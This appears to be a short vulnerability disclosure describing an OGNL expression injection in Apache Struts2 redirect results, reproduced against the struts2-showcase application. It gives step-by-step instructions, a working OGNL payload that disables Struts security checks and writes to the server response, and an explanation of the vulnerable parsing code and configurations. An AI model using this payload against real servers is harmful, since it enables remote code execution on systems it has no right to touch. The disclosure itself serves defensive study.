kxlzx http://www.inbreak.net

flow this and step by step:

1, down load struts2-showcase from struts.apache.org
2, run struts2-showcase.
3, open url: 
http://localhost:8080/struts2-showcase/skill/edit.action?skillName=SPRING-DEV
4, write skill name to %{expr} for example:
%{(#_memberAccess[&#039;allowStaticMethodAccess&#039;]=true)(#context[&#039;xwork.MethodAccessor.denyMethodExecution&#039;]=false)(#hackedbykxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#hackedbykxlzx.println(&#039;hacked by kxlzx&#039;),#hackedbykxlzx.close())}
5, submit and all will done.

this method:
    }
look two char "$" and "%"

and
this method:

        for (char open : openChars) {
.........
            while (true) {
..........

                    Object o = stack.findValue(var, asType);
............
if user input is "%{expr}"
this will execute ognl like:
${%{expr}}

this need devloper code like:

<action name="redirect" class="net.inbreak.RedirectAction">
       <result name="redirect" type="redirect">${redirectUrl}</result>
</action>

or like:
<action name="save" class="org.apache.struts2.showcase.action.SkillAction" method="save">
           <result type="redirect">edit.action?skillName=${currentSkill.name}</result>
</action>

----------
kxlzx at alibaba security team.
my blog :http://www.inbreak.net



